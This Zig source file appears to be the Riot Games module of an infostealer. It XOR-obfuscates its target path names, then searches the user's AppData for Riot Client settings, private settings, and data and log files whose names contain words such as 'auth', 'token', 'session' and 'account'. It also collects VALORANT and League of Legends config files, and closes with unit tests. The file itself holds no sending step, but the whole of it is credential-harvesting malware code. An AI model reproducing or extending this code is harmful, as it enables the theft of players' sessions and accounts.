const std = @import("std");
const hash = @import("../types/hash.zig");

const E = struct {
    pub const riot_games = hash.xorEncrypt("Riot Games");
    pub const riot_client = hash.xorEncrypt("Riot Client");
    pub const config = hash.xorEncrypt("Config");
    pub const data = hash.xorEncrypt("Data");
    pub const logs = hash.xorEncrypt("Logs");
    pub const riot_installs = hash.xorEncrypt("RiotClientInstalls.json");
    pub const riot_private_settings = hash.xorEncrypt("RiotClientPrivateSettings.yaml");
    pub const riot_settings = hash.xorEncrypt("RiotClientSettings.yaml");
    pub const valorant = hash.xorEncrypt("VALORANT");
    pub const league_of_legends = hash.xorEncrypt("League of Legends");
};

pub const RiotResult = struct {
    found: bool,
    files: [][]const u8,
};

fn isSensitiveFile(name: []const u8) bool {
    const ext = std.fs.path.extension(name);
    const ext_list = [_][]const u8{ ".json", ".yaml", ".yml", ".cfg", ".txt", ".log" };
    const kw_list = [_][]const u8{ "config", "settings", "user", "account", "auth", "token", "session" };

    var has_ext = false;
    for (ext_list) |e| {
        if (std.mem.eql(u8, ext, e)) {
            has_ext = true;
            break;
        }
    }
    if (!has_ext) return false;

    const lower = std.ascii.lowerString(std.heap.page_allocator, name) catch return false;
    defer std.heap.page_allocator.free(lower);

    for (kw_list) |kw| {
        if (std.mem.indexOf(u8, lower, kw) != null) return true;
    }
    return false;
}

fn isGameConfig(name: []const u8) bool {
    const ext = std.fs.path.extension(name);
    const ext_list = [_][]const u8{ ".json", ".yaml", ".yml", ".cfg", ".ini", ".txt" };
    const kw_list = [_][]const u8{ "config", "setting", "user", "account", "profile" };

    var has_ext = false;
    for (ext_list) |e| {
        if (std.mem.eql(u8, ext, e)) {
            has_ext = true;
            break;
        }
    }
    if (!has_ext) return false;

    const lower = std.ascii.lowerString(std.heap.page_allocator, name) catch return false;
    defer std.heap.page_allocator.free(lower);

    for (kw_list) |kw| {
        if (std.mem.indexOf(u8, lower, kw) != null) return true;
    }
    if (std.mem.indexOf(u8, lower, "persistedsettings") != null) return true;
    if (std.mem.eql(u8, lower, "game.cfg")) return true;
    return false;
}

fn collectDirFiles(allocator: std.mem.Allocator, dir_path: []const u8, filter: *const fn (name: []const u8) bool) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);

    var dir = std.fs.openDirAbsolute(dir_path, .{}) catch return files.toOwnedSlice();
    defer dir.close();

    var iter = dir.iterate();
    while (iter.next() catch null) |entry| {
        if (entry.kind != .file) continue;
        if (filter(entry.name)) {
            const full = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name });
            try files.append(full);
        }
    }
    return files.toOwnedSlice();
}

pub fn collect(allocator: std.mem.Allocator, local: []const u8, roaming: []const u8) !RiotResult {
    var all_files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (all_files.items) |f| allocator.free(f);
        all_files.deinit();
    }

    var riot_games_decrypted: [E.riot_games.len]u8 = undefined;
    hash.xorDecrypt(&E.riot_games, &riot_games_decrypted);

    const local_riot = try std.fs.path.join(allocator, &[_][]const u8{ local, &riot_games_decrypted });
    defer allocator.free(local_riot);
    const roaming_riot = try std.fs.path.join(allocator, &[_][]const u8{ roaming, &riot_games_decrypted });
    defer allocator.free(roaming_riot);

    var riot_client_decrypted: [E.riot_client.len]u8 = undefined;
    var config_decrypted: [E.config.len]u8 = undefined;
    var data_decrypted: [E.data.len]u8 = undefined;
    var logs_decrypted: [E.logs.len]u8 = undefined;
    var riot_installs_decrypted: [E.riot_installs.len]u8 = undefined;
    var riot_private_settings_decrypted: [E.riot_private_settings.len]u8 = undefined;
    var riot_settings_decrypted: [E.riot_settings.len]u8 = undefined;
    var valorant_decrypted: [E.valorant.len]u8 = undefined;
    var league_of_legends_decrypted: [E.league_of_legends.len]u8 = undefined;

    hash.xorDecrypt(&E.riot_client, &riot_client_decrypted);
    hash.xorDecrypt(&E.config, &config_decrypted);
    hash.xorDecrypt(&E.data, &data_decrypted);
    hash.xorDecrypt(&E.logs, &logs_decrypted);
    hash.xorDecrypt(&E.riot_installs, &riot_installs_decrypted);
    hash.xorDecrypt(&E.riot_private_settings, &riot_private_settings_decrypted);
    hash.xorDecrypt(&E.riot_settings, &riot_settings_decrypted);
    hash.xorDecrypt(&E.valorant, &valorant_decrypted);
    hash.xorDecrypt(&E.league_of_legends, &league_of_legends_decrypted);

    const config_files = [_][]const u8{
        &riot_installs_decrypted,
        &riot_private_settings_decrypted,
        &riot_settings_decrypted,
    };

    const client_path = try std.fs.path.join(allocator, &[_][]const u8{ local_riot, &riot_client_decrypted });
    defer allocator.free(client_path);

    if (std.fs.openDirAbsolute(client_path, .{}) catch null) |*dir| {
        defer dir.close();

        const config_path = try std.fs.path.join(allocator, &[_][]const u8{ client_path, &config_decrypted });
        defer allocator.free(config_path);

        if (std.fs.openDirAbsolute(config_path, .{}) catch null) |*cfg_dir| {
            cfg_dir.close();

            for (config_files) |cfg| {
                const cfg_full = try std.fs.path.join(allocator, &[_][]const u8{ config_path, cfg });
                if (std.fs.accessAbsolute(cfg_full, .{})) {
                    try all_files.append(cfg_full);
                } else {
                    allocator.free(cfg_full);
                }
            }
        }

        for ([_][]const u8{ &data_decrypted, &logs_decrypted }) |sub| {
            const sub_path = try std.fs.path.join(allocator, &[_][]const u8{ client_path, sub });
            defer allocator.free(sub_path);

            const found = collectDirFiles(allocator, sub_path, isSensitiveFile) catch continue;
            try all_files.appendSlice(found);
            allocator.free(found);
        }
    }

    const game_paths = [_][]const u8{
        &valorant_decrypted,
        &league_of_legends_decrypted,
    };

    for (game_paths) |game| {
        for ([_][]const u8{ local_riot, roaming_riot }) |base| {
            const game_path = try std.fs.path.join(allocator, &[_][]const u8{ base, game });
            defer allocator.free(game_path);

            const found = collectDirFiles(allocator, game_path, isGameConfig) catch continue;
            try all_files.appendSlice(found);
            allocator.free(found);
        }
    }

    return RiotResult{
        .found = all_files.items.len > 0,
        .files = try all_files.toOwnedSlice(),
    };
}

fn freeRiotResult(result: RiotResult, allocator: std.mem.Allocator) void {
    for (result.files) |f| allocator.free(f);
    allocator.free(result.files);
}

const testing = std.testing;

test "riot not found" {
    const result = try collect(testing.allocator, "C:\\__nonexistent__local", "C:\\__nonexistent__roaming");
    defer freeRiotResult(result, testing.allocator);
    try testing.expect(!result.found);
    try testing.expectEqual(@as(usize, 0), result.files.len);
}

test "collect returns empty for nonexistent riot" {
    const result = try collect(testing.allocator, "C:\\__missing__", "C:\\__missing__");
    defer freeRiotResult(result, testing.allocator);
    try testing.expect(!result.found);
    try testing.expectEqual(@as(usize, 0), result.files.len);
}

test "RiotResult default" {
    const rr = RiotResult{
        .found = false,
        .files = &[_][]const u8{},
    };
    try testing.expect(!rr.found);
    try testing.expectEqual(@as(usize, 0), rr.files.len);
}
